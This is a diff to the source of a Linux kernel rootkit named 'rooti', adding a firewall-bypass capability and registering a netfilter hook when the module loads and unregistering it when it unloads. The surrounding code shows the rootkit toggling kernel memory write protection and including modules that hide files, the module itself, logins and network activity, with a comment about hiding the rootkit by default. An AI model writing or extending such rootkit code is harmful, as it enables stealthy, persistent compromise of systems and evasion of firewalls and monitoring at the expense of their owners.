@@ -16,12 +16,15 @@
 #include "capabilities/privilege.h"
 #include "capabilities/tracking.h"
 #include "capabilities/unloading.h"
+#include "capabilities/fw_bypass.h"
 #include "capabilities/hiding/dentry.h"
 #include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
 #include "capabilities/hiding/net.h"
 #include "utils.h"
 #include "config.h"
+
+#include <linux/netfilter.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omri Ben Zikri");
@@ -377,6 +380,8 @@ static int __init rooti_init(void)
     // Re-enable write protection
     rooti_protect_memory();
 
+    nf_register_net_hook(&init_net, &rooti_netfilter_hook_ops);
+
     // If configured to be hidden by default, hide this rootkit
 #ifndef ROOTI_DEBUG_SHOWME
     ret = rooti_hideme();
@@ -410,6 +415,8 @@ static void __exit rooti_exit(void)
 
     // Re-enable write protection
     rooti_protect_memory();
+
+    nf_unregister_net_hook(&init_net, &rooti_netfilter_hook_ops);
 
     // Release any remaining records
     struct rooti_tracked_fd *record;
